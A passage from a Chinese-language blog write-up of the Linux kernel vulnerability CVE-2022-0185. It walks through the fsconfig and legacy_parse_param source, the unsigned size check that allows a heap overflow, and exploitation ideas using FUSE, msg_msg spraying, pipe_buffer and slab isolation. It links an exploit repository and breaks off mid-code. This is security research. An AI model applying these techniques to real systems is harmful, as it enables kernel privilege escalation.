-EBADF;\t\tparam.file = fget(aux);\t\tif (!param.file)\t\t\tgoto out_key;\t\tbreak;\tdefault:\t\tbreak;\t&#125;\tret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);\tif (ret == 0) &#123;\t\tret = vfs_fsconfig_locked(fc, cmd, &amp;param);\t\tmutex_unlock(&amp;fc-&gt;uapi_mutex);\t&#125;\t/* Clean up the our record of any value that we obtained from\t * userspace.  Note that the value may have been stolen by the LSM or\t * filesystem, in which case the value pointer will have been cleared.\t */\tswitch (cmd) &#123;\tcase FSCONFIG_SET_STRING:\tcase FSCONFIG_SET_BINARY:\t\tkfree(param.string);\t\tbreak;\tcase FSCONFIG_SET_PATH:\tcase FSCONFIG_SET_PATH_EMPTY:\t\tif (param.name)\t\t\tputname(param.name);\t\tbreak;\tcase FSCONFIG_SET_FD:\t\tif (param.file)\t\t\tfput(param.file);\t\tbreak;\tdefault:\t\tbreak;\t&#125;out_key:\tkfree(param.key);out_f:\tfdput(f);\treturn ret;&#125;\n\n在前面主要操作是对参数进行各种检测，紧接着获取到文件描述符，接着获取fs_config，随后拷贝key字段到内核中，最终根据不同的cmd进入switch\ncase FSCONFIG_SET_STRING:\t\tparam.type = fs_value_is_string;\t\tparam.string = strndup_user(_value, 256);\t\tif (IS_ERR(param.string)) &#123;\t\t\tret = PTR_ERR(param.string);\t\t\tgoto out_key;\t\t&#125;\t\tparam.size = strlen(param.string);\t\tbreak;\n\n这里主要关注这一个分支，在分支中设置完param之后进入后续流程，最终进入到vfs_fsconfig_locked函数进行处理。\nfsmount完成了文件系统上下文的创建与配置，接下来终于来到文件系统的挂载操作了，fsmount() 系统调用用以获取一个可以被用以进行挂载的挂载实例，并返回一个文件描述符用以下一步的挂载\n#include &lt;sys/syscall.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;linux/mount.h&gt;#ifndef __NR_fsopen#define __NR_fsopen 430#endif#ifndef __NR_fsconfig#define __NR_fsconfig 431#endif#ifndef __NR_fsmount#define __NR_fsmount 432#endifint fsopen(const char *fs_name, unsigned int flags)&#123;    return syscall(__NR_fsopen, fs_name, flags);&#125;int fsconfig(int fsfd, unsigned int cmd, const char *key, const void *val, int aux)&#123;    return syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);&#125;int fsmount(int fsfd, unsigned int flags, unsigned int ms_flags)&#123;    return syscall(__NR_fsmount, fsfd, flags, ms_flags);&#125;int main(int argc, char **argv, char **envp)&#123;    int fs_fd, mount_fd;        fs_fd = fsopen(&quot;ext4&quot;, 0);    if (fs_fd &lt; 0) &#123;        puts(&quot;[x] FAILED to fsopen!&quot;);        return -1;    &#125;    printf(&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\\n&quot;, fs_fd);    fsconfig(fs_fd, FSCONFIG_SET_STRING, &quot;source&quot;, &quot;/dev/sdb1&quot;, 0);    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, NULL, NULL, 0);    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);    return 0;&#125;\n\nmove_mount最后使用move_mount系统调用将挂载实例在挂载点之间移动，对于尚未进行挂载的挂载实例而言，进行挂载的操作便是从空挂载点 &quot;&quot; 移动到对应的挂载点（例如 &quot;/mnt/temp&quot;），此时我们并不需要给出目的挂载点的 fd，而可以使用 AT_FDCWD，引入了 move_mount() 之后，我们最终的一个用以将 &quot;/dev/sdb1&quot; 以 &quot;ext4&quot; 文件系统挂载到 &quot;/mnt/temp&quot; 的完整示例程序如下：\n#include &lt;sys/syscall.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;linux/mount.h&gt;#include &lt;fcntl.h&gt;#ifndef __NR_fsopen#define __NR_fsopen 430#endif#ifndef __NR_fsconfig#define __NR_fsconfig 431#endif#ifndef __NR_fsmount#define __NR_fsmount 432#endif#ifndef __NR_move_mount#define __NR_move_mount 429#endifint fsopen(const char *fs_name, unsigned int flags)&#123;    return syscall(__NR_fsopen, fs_name, flags);&#125;int fsconfig(int fsfd, unsigned int cmd, const char *key, const void *val, int aux)&#123;    return syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);&#125;int fsmount(int fsfd, unsigned int flags, unsigned int ms_flags)&#123;    return syscall(__NR_fsmount, fsfd, flags, ms_flags);&#125;int move_mount(int from_dfd, const char *from_pathname,int to_dfd,                const char *to_pathname, unsigned int flags)&#123;    return syscall(__NR_move_mount, from_dfd, from_pathname, to_dfd, to_pathname, flags);&#125;int main(int argc, char **argv, char **envp)&#123;    int fs_fd, mount_fd;        fs_fd = fsopen(&quot;ext4&quot;, 0);    if (fs_fd &lt; 0) &#123;        puts(&quot;[x] FAILED to fsopen!&quot;);        return -1;    &#125;    printf(&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\\n&quot;, fs_fd);    fsconfig(fs_fd, FSCONFIG_SET_STRING, &quot;source&quot;, &quot;/dev/sdb1&quot;, 0);    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, NULL, NULL, 0);    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);    move_mount(mount_fd, &quot;&quot;, AT_FDCWD, &quot;/mnt/temp&quot;, MOVE_MOUNT_F_EMPTY_PATH);    return 0;&#125;\n\n这里介绍几乎就是照抄a3和知乎的文章\n漏洞分析前面提到在fsconfig函数中，最终会调用vfs_fsconfig_locked函数\nstatic int vfs_fsconfig_locked(struct fs_context *fc, int cmd,\t\t\t       struct fs_parameter *param)&#123;\tstruct super_block *sb;\tint ret;\tret = finish_clean_context(fc);\tif (ret)\t\treturn ret;\tswitch (cmd) &#123;\tcase FSCONFIG_CMD_CREATE:\t\tif (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS)\t\t\treturn -EBUSY;\t\tif (!mount_capable(fc))\t\t\treturn -EPERM;\t\tfc-&gt;phase = FS_CONTEXT_CREATING;\t\tret = vfs_get_tree(fc);\t\tif (ret)\t\t\tbreak;\t\tsb = fc-&gt;root-&gt;d_sb;\t\tret = security_sb_kern_mount(sb);\t\tif (unlikely(ret)) &#123;\t\t\tfc_drop_locked(fc);\t\t\tbreak;\t\t&#125;\t\tup_write(&amp;sb-&gt;s_umount);\t\tfc-&gt;phase = FS_CONTEXT_AWAITING_MOUNT;\t\treturn 0;\tcase FSCONFIG_CMD_RECONFIGURE:\t\tif (fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)\t\t\treturn -EBUSY;\t\tfc-&gt;phase = FS_CONTEXT_RECONFIGURING;\t\tsb = fc-&gt;root-&gt;d_sb;\t\tif (!ns_capable(sb-&gt;s_user_ns, CAP_SYS_ADMIN)) &#123;\t\t\tret = -EPERM;\t\t\tbreak;\t\t&#125;\t\tdown_write(&amp;sb-&gt;s_umount);\t\tret = reconfigure_super(fc);\t\tup_write(&amp;sb-&gt;s_umount);\t\tif (ret)\t\t\tbreak;\t\tvfs_clean_context(fc);\t\treturn 0;\tdefault:\t\tif (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS &amp;&amp;\t\t    fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)\t\t\treturn -EBUSY;\t\treturn vfs_parse_fs_param(fc, param);\t&#125;\tfc-&gt;phase = FS_CONTEXT_FAILED;\treturn ret;&#125;\n\n可以看到上述函数中依旧是根据cmd进入不同的swith分支\nenum fsconfig_command &#123;\tFSCONFIG_SET_FLAG\t= 0,\t/* Set parameter, supplying no value */\tFSCONFIG_SET_STRING\t= 1,\t/* Set parameter, supplying a string value */\tFSCONFIG_SET_BINARY\t= 2,\t/* Set parameter, supplying a binary blob value */\tFSCONFIG_SET_PATH\t= 3,\t/* Set parameter, supplying an object by path */\tFSCONFIG_SET_PATH_EMPTY\t= 4,\t/* Set parameter, supplying an object by (empty) path */\tFSCONFIG_SET_FD\t\t= 5,\t/* Set parameter, supplying an object by fd */\tFSCONFIG_CMD_CREATE\t= 6,\t/* Invoke superblock creation */\tFSCONFIG_CMD_RECONFIGURE = 7,\t/* Invoke superblock reconfiguration */&#125;;\n\n根据定义，最终会进入到default分支中，最终会调用vfs_parse_fs_param函数\nint vfs_parse_fs_param(struct fs_context *fc, struct fs_parameter *param)&#123;\tint ret;\tif (!param-&gt;key)\t\treturn invalf(fc, &quot;Unnamed parameter\\n&quot;);\tret = vfs_parse_sb_flag(fc, param-&gt;key);\tif (ret != -ENOPARAM)\t\treturn ret;\tret = security_fs_context_parse_param(fc, param);\tif (ret != -ENOPARAM)\t\t/* Param belongs to the LSM or is disallowed by the LSM; so\t\t * don&#x27;t pass to the FS.\t\t */\t\treturn ret;\tif (fc-&gt;ops-&gt;parse_param) &#123;\t\tret = fc-&gt;ops-&gt;parse_param(fc, param);\t\tif (ret != -ENOPARAM)\t\t\treturn ret;\t&#125;\t/* If the filesystem doesn&#x27;t take any arguments, give it the\t * default handling of source.\t */\tif (strcmp(param-&gt;key, &quot;source&quot;) == 0) &#123;\t\tif (param-&gt;type != fs_value_is_string)\t\t\treturn invalf(fc, &quot;VFS: Non-string source&quot;);\t\tif (fc-&gt;source)\t\t\treturn invalf(fc, &quot;VFS: Multiple sources&quot;);\t\tfc-&gt;source = param-&gt;string;\t\tparam-&gt;string = NULL;\t\treturn 0;\t&#125;\treturn invalf(fc, &quot;%s: Unknown parameter &#x27;%s&#x27;&quot;,\t\t      fc-&gt;fs_type-&gt;name, param-&gt;key);&#125;EXPORT_SYMBOL(vfs_parse_fs_param);\n\n而在此函数中会调用到fs_context-&gt;ops-&gt;parse_param，接着根据前面在legacy_init_fs_context函数中会对fs_context-&gt;ops赋值为legacy_fs_context_ops\nconst struct fs_context_operations legacy_fs_context_ops = &#123;\t.free\t\t\t= legacy_fs_context_free,\t.dup\t\t\t= legacy_fs_context_dup,\t.parse_param\t\t= legacy_parse_param,\t.parse_monolithic\t= legacy_parse_monolithic,\t.get_tree\t\t= legacy_get_tree,\t.reconfigure\t\t= legacy_reconfigure,&#125;;\n\n根据前面所述，最终会调用到legacy_parse_param函数中。\nstatic int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)&#123;\tstruct legacy_fs_context *ctx = fc-&gt;fs_private;\tunsigned int size = ctx-&gt;data_size;\tsize_t len = 0;\tif (strcmp(param-&gt;key, &quot;source&quot;) == 0) &#123;\t\tif (param-&gt;type != fs_value_is_string)\t\t\treturn invalf(fc, &quot;VFS: Legacy: Non-string source&quot;);\t\tif (fc-&gt;source)\t\t\treturn invalf(fc, &quot;VFS: Legacy: Multiple sources&quot;);\t\tfc-&gt;source = param-&gt;string;\t\tparam-&gt;string = NULL;\t\treturn 0;\t&#125;\tif (ctx-&gt;param_type == LEGACY_FS_MONOLITHIC_PARAMS)\t\treturn invalf(fc, &quot;VFS: Legacy: Can&#x27;t mix monolithic and individual options&quot;);\tswitch (param-&gt;type) &#123;\tcase fs_value_is_string:\t\tlen = 1 + param-&gt;size;\t\t/* Fall through */\tcase fs_value_is_flag:\t\tlen += strlen(param-&gt;key);\t\tbreak;\tdefault:\t\treturn invalf(fc, &quot;VFS: Legacy: Parameter type for &#x27;%s&#x27; not supported&quot;,\t\t\t      param-&gt;key);\t&#125;\tif (len &gt; PAGE_SIZE - 2 - size)\t\treturn invalf(fc, &quot;VFS: Legacy: Cumulative options too large&quot;);\tif (strchr(param-&gt;key, &#x27;,&#x27;) ||\t    (param-&gt;type == fs_value_is_string &amp;&amp;\t     memchr(param-&gt;string, &#x27;,&#x27;, param-&gt;size)))\t\treturn invalf(fc, &quot;VFS: Legacy: Option &#x27;%s&#x27; contained comma&quot;,\t\t\t      param-&gt;key);\tif (!ctx-&gt;legacy_data) &#123;\t\tctx-&gt;legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);\t\tif (!ctx-&gt;legacy_data)\t\t\treturn -ENOMEM;\t&#125;\tctx-&gt;legacy_data[size++] = &#x27;,&#x27;;\tlen = strlen(param-&gt;key);\tmemcpy(ctx-&gt;legacy_data + size, param-&gt;key, len);\tsize += len;\tif (param-&gt;type == fs_value_is_string) &#123;\t\tctx-&gt;legacy_data[size++] = &#x27;=&#x27;;\t\tmemcpy(ctx-&gt;legacy_data + size, param-&gt;string, param-&gt;size);\t\tsize += param-&gt;size;\t&#125;\tctx-&gt;legacy_data[size] = &#x27;\\0&#x27;;\tctx-&gt;data_size = size;\tctx-&gt;param_type = LEGACY_FS_INDIVIDUAL_PARAMS;\treturn 0;&#125;\n\n首先在ctx-&gt;data_size中取出已拷贝的大小，随后根据param-&gt;type计算出len，若是不存在ctx-&gt;legacy_data则会申请一张页面大小，后续则是从param中取出数据写到ctx-legacy_data中去。\n可以看到在计算出len之后其实是经过了一次判断的，len &gt; PAGE_SIZE - 2 - size这里就是其表达式，不过存在问题的是在函数开头定义size使用的是unsigned int，所以这个判断就成了无符号类型的判断了，一旦size + 2大于PAGE_SIZE那么这个判断是会一直成立的，从而达到了溢出的效果。\n不过这里需要注意的是在前面的fsconfig系统调用实现的函数中在对param进行初始化时使用的是这样一条语句\nparam.string = strndup_user(_value, 256);\n\n这里也就限制了我们单次写入的大小只能是0x100个字节，不过可以看到的是在legacy_parse_param函数末尾是又对ctx-&gt;data_size进行了赋值并且值的大小为len + size和size += param-&gt;size;，并且后面在拷贝的时候使用的是ctx-&gt;legacy_data + size。所以我们想要达到溢出的效果需要将size构造为4095。\n前面提到了size最终的值是那两个的和，但其实还存在两个操作会对其做增加操作，也就是在每一条前面都会加上一个&quot;,&quot;而在key后面都会加上一个&quot;=&quot;所以其实写入的最终效果如下\n,key=val\n\n所以每一次拷贝的长度其实是strlen(key) + strlen(val) + 2\n漏洞利用可以预见的是，当我们控制size = 4095时，他会在下一个相邻object写入=以及末尾的一个\\x00，所以这里采取的办法是不直接覆盖相邻object的内容，而是直接覆盖掉后一个object的内容。\nFUSE在以往的文章中提到了userfaultfd系统调用，可惜的是在Linux 5.11起就不再能用普通用户进行调用了，然而其实FUSE也是可以达到重样的效果的。\n首先简单介绍一下FUSE，即用户空间文件系统，该功能允许非特权用户在用户空间实现一个用户态文件系统，开发者只需要实现对应的文件操作接口就可以在用户空间实现一个文件系统，而不需要重新编译内核，这给开发者提供了相当的便利。\nFUSE 自 Linux 2.6.14 版本引入，主要由两部分组成：\n\n  FUSE 内核模块，负责与 kernel 的 VFS 进行交互，并向用户空间实现的文件系统进程暴露 /dev/fuse 块设备接口\n  用户空间的 libfuse 库 负责向用户程序提供封装好的接口，开发者基于该库进行用户空间文件系统的开发：由一个 FUSE daemon 守护进程负责与内核模块进行交互并进行文件系统的具体操作\n\n\nFUSE 的基本运行原理如下：\n\n  FUSE daemon 守护进程通过 libfuse 库的 fuse_main() 注册文件系统与对应的处理函数，并挂载到对应的目录下（例如 /mnt/fuse）\n  用户进程访问挂载点下的文件（例如 /mnt/fuse/file），来到内核中的 VFS 对应 inode 的 inode_operations 中的处理函数，交由 FUSE 内核模块进行处理\n  FUSE 内核模块将请求转换为与用户态 daemon 进程间约定的格式，交由用户态对应的 FUSE daemon 守护进程进行处理\n  在 FUSE daemon 调用文件系统创建时注册的对应的处理函数，这一步可能会需要访问实际的文件系统\n  FUSE daemon 完成处理，返回结果至 FUSE 内核模块，再经由 VFS 返回给用户进程\n\n\n这里不过多介绍了，后面就说说基本用法就行了，也和userfaultfd类似，是一个模板。\nstruct fuse_operations &#123;\tint (*getattr) (const char *, struct stat *, struct fuse_file_info *fi);\tint (*readlink) (const char *, char *, size_t);\tint (*mknod) (const char *, mode_t, dev_t);\tint (*mkdir) (const char *, mode_t);\t/** Remove a file */\tint (*unlink) (const char *);\t/** Remove a directory */\tint (*rmdir) (const char *);\t/** Create a symbolic link */\tint (*symlink) (const char *, const char *);\tint (*rename) (const char *, const char *, unsigned int flags);\tint (*link) (const char *, const char *);\tint (*chmod) (const char *, mode_t, struct fuse_file_info *fi);\tint (*chown) (const char *, uid_t, gid_t, struct fuse_file_info *fi);\tint (*truncate) (const char *, off_t, struct fuse_file_info *fi);\tint (*open) (const char *, struct fuse_file_info *);\tint (*read) (const char *, char *, size_t, off_t,\t\t     struct fuse_file_info *);\tint (*write) (const char *, const char *, size_t, off_t,\t\t      struct fuse_file_info *);\tint (*statfs) (const char *, struct statvfs *);\tint (*flush) (const char *, struct fuse_file_info *);\tint (*release) (const char *, struct fuse_file_info *);\tint (*fsync) (const char *, int, struct fuse_file_info *);\tint (*setxattr) (const char *, const char *, const char *, size_t, int);\tint (*getxattr) (const char *, const char *, char *, size_t);\tint (*listxattr) (const char *, char *, size_t);\tint (*removexattr) (const char *, const char *);\tint (*opendir) (const char *, struct fuse_file_info *);\tint (*readdir) (const char *, void *, fuse_fill_dir_t, off_t,\t\t\tstruct fuse_file_info *, enum fuse_readdir_flags);\tint (*releasedir) (const char *, struct fuse_file_info *);\tint (*fsyncdir) (const char *, int, struct fuse_file_info *);\tvoid *(*init) (struct fuse_conn_info *conn,\t\t       struct fuse_config *cfg);\tvoid (*destroy) (void *private_data);\tint (*access) (const char *, int);\tint (*create) (const char *, mode_t, struct fuse_file_info *);\tint (*lock) (const char *, struct fuse_file_info *, int cmd,\t\t     struct flock *);\t int (*utimens) (const char *, const struct timespec tv[2],\t\t\t struct fuse_file_info *fi);\tint (*bmap) (const char *, size_t blocksize, uint64_t *idx);#if FUSE_USE_VERSION &lt; 35\tint (*ioctl) (const char *, int cmd, void *arg,\t\t      struct fuse_file_info *, unsigned int flags, void *data);#else\tint (*ioctl) (const char *, unsigned int cmd, void *arg,\t\t      struct fuse_file_info *, unsigned int flags, void *data);#endif\tint (*poll) (const char *, struct fuse_file_info *,\t\t     struct fuse_pollhandle *ph, unsigned *reventsp);\tint (*write_buf) (const char *, struct fuse_bufvec *buf, off_t off,\t\t\t  struct fuse_file_info *);\tint (*read_buf) (const char *, struct fuse_bufvec **bufp,\t\t\t size_t size, off_t off, struct fuse_file_info *);\tint (*flock) (const char *, struct fuse_file_info *, int op);\tint (*fallocate) (const char *, int, off_t, off_t,\t\t\t  struct fuse_file_info *);\tssize_t (*copy_file_range) (const char *path_in,\t\t\t\t    struct fuse_file_info *fi_in,\t\t\t\t    off_t offset_in, const char *path_out,\t\t\t\t    struct fuse_file_info *fi_out,\t\t\t\t    off_t offset_out, size_t size, int flags);\toff_t (*lseek) (const char *, off_t off, int whence, struct fuse_file_info *);&#125;;\n\n在使用时需要先实现上面函数表中的函数接口，我们自定义的用户态文件系统的操作其实都是通过对该函数表中定义的函数回调实现的。\n不难想到，注册一个用户空间文件系统，为读写等接口注册回调函数，使用 mmap 将该文件系统中的一个文件映射到内存中，当进程在内核中读写这块 mmap 内存时，便会触发缺页异常，此时控制权便会转交到我们注册的回调函数当中，然而在回调函数中的操作是我们可以控制的，所以效果就很类似于userfaultfd了。\n不过常规的 libfuse 库并不支持静态编译，这使得我们无法像以往一样先静态编译一个 exp 再传到远程，不过在此CVE的github仓库中存在其静态编译的操作。https://github.com/Crusaders-of-Rust/CVE-2022-0185\npipe_buffer这里有两种利用方式，首先就是我们在 向pipe_buffer说yes！ 文章中提到的使用pipe_buffer构造出页级的UAF，最终实现任意地址读写。这里简单介绍一下在这个漏洞中如何使用就行，不过多停留了 绝对不是因为我是懒狗不想写exp ，这篇文章重点还是看FUSE的用法，所以具体还是在另一种利用手法。\n首先，在开始size = 4095时即便是传入的key为\\x00时也会在下一个object中写入一个&quot;=&quot;，所以不幸的是不能直接修改下一个紧邻的pipe_buffer-&gt;page。前面也提到了这里选择的方式修改下一个object紧邻的下一个object，不过我们如果单纯使用pipe_buffer进行堆喷时会出现一个问题，在后续寻找被覆盖page指针的pipe_buffer的idx时会出现一个大问题，那就是因为前面修改导致读取pipe时导致kernel panic。所以a3选择的办法是使用msg_msg进行大量堆喷，通过修改m_ts来判断哪个msg_msg是被覆盖掉了，之后这个msg_msg就不再使用防止出现kernel panic，那此时也就成功将漏洞转化成了off by null了，后续的使用其实就和上面的文章中一致了，不熟悉的朋友可以去看看。\n当然这里还需要考虑的就是order了，此处申请的object对应的order为3。当然，各位知道知道的pipe提供fcntl(F_SETPIPE_SZ)调用可以去修改pipe_buffer的数量，所以可以达到对应的order当然msg_msg同理。\n内部隔离分析在看完第一种利用方式的朋友们可能会有点疑惑，”为什么可以使用msg_msg？”。在ctf-wiki中写了”在linux kernel 5.9之前和linux kernel 5.11之后都是存在堆块隔离的”。\nenum kmalloc_cache_type &#123;\tKMALLOC_NORMAL = 0,#ifndef CONFIG_ZONE_DMA\tKMALLOC_DMA = KMALLOC_NORMAL,#endif#ifndef CONFIG_MEMCG_KMEM\tKMALLOC_CGROUP = KMALLOC_NORMAL,#else\tKMALLOC_CGROUP,#endif\tKMALLOC_RECLAIM,#ifdef CONFIG_ZONE_DMA\tKMALLOC_DMA,#endif\tNR_KMALLOC_TYPES&#125;;\n\n在kernel 5.14之后存在如上的cache type，其中常被认为隔离的是KMALLOC_CGROUPT其对应的是flag为GFP_KERNEL_ACCOUNT的申请，可以在slabinfo文件中看到其cache的名字为kmalloc-cg-*。而GFP_KERNEL则对应的就是KMALLOC_NORMAL类型，在slabinfo中就是普通的kmalloc-*。\n下面简单介绍一下内存隔离的原理：\nstatic __always_inline void *kmalloc(size_t size, gfp_t flags)&#123;\tif (__builtin_constant_p(size)) &#123;#ifndef CONFIG_SLOB\t\tunsigned int index;#endif\t\tif (size &gt; KMALLOC_MAX_CACHE_SIZE)\t\t\treturn kmalloc_large(size, flags);#ifndef CONFIG_SLOB\t\tindex = kmalloc_index(size);\t\tif (!index)\t\t\treturn ZERO_SIZE_PTR;\t\treturn kmem_cache_alloc_trace(\t\t\t\tkmalloc_caches[kmalloc_type(flags)][index],\t\t\t\tflags, size);#endif\t&#125;\treturn __kmalloc(size, flags);&#125;\n\n在内核kmalloc的实现里面可以看到的是，会给kmem_cache_alloc_trace传入一个cache，另外kmalloc_caches是一个二重数组，首先是根据对应的type然后根据size确定不同的index取出最终的cache。\n这里重点看一下kmalloc_type函数\n#define KMALLOC_NOT_NORMAL_BITS\t\t\t\t\t\\\t(__GFP_RECLAIMABLE |\t\t\t\t\t\\\t(IS_ENABLED(CONFIG_ZONE_DMA)   ? __GFP_DMA : 0) |\t\\\t(IS_ENABLED(CONFIG_MEMCG_KMEM) ? __GFP_ACCOUNT : 0))static __always_inline enum kmalloc_cache_type kmalloc_type(gfp_t flags)&#123;\t/*\t * The most common case is KMALLOC_NORMAL, so test for it\t * with a single branch for all the relevant flags.\t */\tif (likely((flags &amp; KMALLOC_NOT_NORMAL_BITS) == 0))\t\treturn KMALLOC_NORMAL;\t/*\t * At least one of the flags has to be set. Their priorities in\t * decreasing order are:\t *  1) __GFP_DMA\t *  2) __GFP_RECLAIMABLE\t *  3) __GFP_ACCOUNT\t */\tif (IS_ENABLED(CONFIG_ZONE_DMA) &amp;&amp; (flags &amp; __GFP_DMA))\t\treturn KMALLOC_DMA;\tif (!IS_ENABLED(CONFIG_MEMCG_KMEM) || (flags &amp; __GFP_RECLAIMABLE))\t\treturn KMALLOC_RECLAIM;\telse\t\treturn KMALLOC_CGROUP;&#125;\n\n这里主要看一下KMALLOC_NOT_NORMAL_BITS的定义，因为kernel默认存在CONFIG_MEMCG_KMEM选项所以添加了__GFP_ACCOUNT标识为，以至于flag为GFP_KERNEL_ACCOUNT时不会直接返回KMALLOC_NORMAL了，这也就导致了堆块隔离。\n根据上面的分析会发现在linux kernel 5.9之前确实没有KMALLOC_CGROUP这样一个新建的kmem_cache，不过其实在此之前依旧是存在隔离的，这里分析一下在linux kernel 5.9之前的隔离实现原理。\nstruct kmem_cache &#123;\tstruct kmem_cache_cpu __percpu *cpu_slab;\t/* Used for retrieving partial slabs, etc. */\tslab_flags_t flags;\tunsigned long min_partial;\tunsigned int size;\t/* The size of an object including metadata */\tunsigned int object_size;/* The size of an object without metadata */\tunsigned int offset;\t/* Free pointer offset */#ifdef CONFIG_SLUB_CPU_PARTIAL\t/* Number of per cpu partial objects to keep around */\tunsigned int cpu_partial;#endif\tstruct kmem_cache_order_objects oo;\t/* Allocation and freeing of slabs */\tstruct kmem_cache_order_objects max;\tstruct kmem_cache_order_objects min;\tgfp_t allocflags;\t/* gfp flags to use on each alloc */\tint refcount;\t\t/* Refcount for slab cache destroy */\tvoid (*ctor)(void *);\tunsigned int inuse;\t\t/* Offset to metadata */\tunsigned int align;\t\t/* Alignment */\tunsigned int red_left_pad;\t/* Left redzone padding size */\tconst char *name;\t/* Name (only for display!) */\tstruct list_head list;\t/* List of slab caches */#ifdef CONFIG_SYSFS\tstruct kobject kobj;\t/* For sysfs */\tstruct work_struct kobj_remove_work;#endif#ifdef CONFIG_MEMCG\tstruct memcg_cache_params memcg_params;\t/* For propagation, maximum size of a stored attr */\tunsigned int max_attr_size;#ifdef CONFIG_SYSFS\tstruct kset *memcg_kset;#endif#endif#ifdef CONFIG_SLAB_FREELIST_HARDENED\tunsigned long random;#endif#ifdef CONFIG_NUMA\t/*\t * Defragmentation by allocating from a remote node.\t */\tunsigned int remote_node_defrag_ratio;#endif#ifdef CONFIG_SLAB_FREELIST_RANDOM\tunsigned int *random_seq;#endif#ifdef CONFIG_KASAN\tstruct kasan_cache kasan_info;#endif\tunsigned int useroffset;\t/* Usercopy region offset */\tunsigned int usersize;\t\t/* Usercopy region size */\tstruct kmem_cache_node *node[MAX_NUMNODES];&#125;;\n\n在之前的kmem_cache结构体的定义如上，可以看到的是内部会根据是否开启了MEMCG这个选项来添加struct memcg_cache_params memcg_params;这样一个额外的结构体。\nstruct memcg_cache_params &#123;\tstruct kmem_cache *root_cache;\tunion &#123;\t\tstruct &#123;\t\t\tstruct memcg_cache_array __rcu *memcg_caches;\t\t\tstruct list_head __root_caches_node;\t\t\tstruct list_head children;\t\t\tbool dying;\t\t&#125;;\t\tstruct &#123;\t\t\tstruct mem_cgroup *memcg;\t\t\tstruct list_head children_node;\t\t\tstruct list_head kmem_caches_node;\t\t\tstruct percpu_ref refcnt;\t\t\tvoid (*work_fn)(struct kmem_cache *);\t\t\tunion &#123;\t\t\t\tstruct rcu_head rcu_head;\t\t\t\tstruct work_struct work;\t\t\t&#125;;\t\t&#125;;\t&#125;;&#125;;\n\n可以看到的是首先会存放一个根slab的指针，在memcg_caches这里存放若干个子memcg slab管理结构。\nstruct memcg_cache_array &#123;\tstruct rcu_head rcu;\tstruct kmem_cache *entries[0];&#125;;\n\n也就是说其可以通过根slab和子slab互相寻找。在上面这里结构体的定义中entries就是用于存放memcg slab的数组。所以可以理解为每一个根slab管理结构(根slab管理结构根据大小分类)都有一个对应的子memcg slab列表。\n上面多为理论中的内容，下面讨论一下在实际面对时所遇到的问题：\n在这个CVE中，所使用的所有分配对象的函数都为kmalloc那么这里先从这里看起\nstatic __always_inline void *kmalloc(size_t size, gfp_t flags)&#123;\tif (__builtin_constant_p(size)) &#123;#ifndef CONFIG_SLOB\t\tunsigned int index;#endif\t\tif (size &gt; KMALLOC_MAX_CACHE_SIZE)\t\t\treturn kmalloc_large(size, flags);#ifndef CONFIG_SLOB\t\tindex = kmalloc_index(size);\t\tif (!index)\t\t\treturn ZERO_SIZE_PTR;\t\treturn kmem_cache_alloc_trace(\t\t\t\tkmalloc_caches[kmalloc_type(flags)][index],\t\t\t\tflags, size);#endif\t&#125;\treturn __kmalloc(size, flags);&#125;\n\n可以看到上面在分为了两条分支，根据的是size是否为定量，那么根据这个cve正好会分别进入上面的两条分支中。在分配msg_msg时会进入到下面的__kmalloc函数中，在分配ctx-&gt;legacy_data时则会进入到上面的分支中。\nvoid *__kmalloc(size_t size, gfp_t flags)&#123;\tstruct kmem_cache *s;\tvoid *ret;\tif (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE))\t\treturn kmalloc_large(size, flags);\ts = kmalloc_slab(size, flags);\tif (unlikely(ZERO_OR_NULL_PTR(s)))\t\treturn s;\tret = slab_alloc(s, flags, _RET_IP_);\ttrace_kmalloc(_RET_IP_, ret, size, s-&gt;size, flags);\tret = kasan_kmalloc(s, ret, size, flags);\treturn ret;&#125;EXPORT_SYMBOL(__kmalloc);\n\n这里主要关注下面的__kmalloc函数，可以看到其中会先进入到kmalloc_slab获取对应的slab，其实根据动态调试的结果看到的是这里的slab与分配ctx-&gt;legacy_data时进入kmem_cache_alloc_trace函数的第一个参数是一致的所以我当时就很迷惑，随即请教了a3又看了一下linux kernel 5.9的commit才知道会在slab_alloc函数中出现问题。\nstatic __always_inline void *slab_alloc_node(struct kmem_cache *s,\t\tgfp_t gfpflags, int node, unsigned long addr)&#123;\tvoid *object;\tstruct kmem_cache_cpu *c;\tstruct page *page;\tunsigned long tid;\ts = slab_pre_alloc_hook(s, gfpflags);\tif (!s)\t\treturn NULL;redo:\tdo &#123;\t\ttid = this_cpu_read(s-&gt;cpu_slab-&gt;tid);\t\tc = raw_cpu_ptr(s-&gt;cpu_slab);\t&#125; while (IS_ENABLED(CONFIG_PREEMPT) &amp;&amp;\t\t unlikely(tid != READ_ONCE(c-&gt;tid)));\tbarrier();\tobject = c-&gt;freelist;\tpage = c-&gt;page;\tif (unlikely(!object || !node_match(page, node))) &#123;\t\tobject = __slab_alloc(s, gfpflags, node, addr, c);\t\tstat(s, ALLOC_SLOWPATH);\t&#125; else &#123;\t\tvoid *next_object = get_freepointer_safe(s, object);\t\tif (unlikely(!this_cpu_cmpxchg_double(\t\t\t\ts-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,\t\t\t\tobject, tid,\t\t\t\tnext_object, next_tid(tid)))) &#123;\t\t\tnote_cmpxchg_failure(&quot;slab_alloc&quot;, s, tid);\t\t\tgoto redo;\t\t&#125;\t\tprefetch_freepointer(s, next_object);\t\tstat(s, 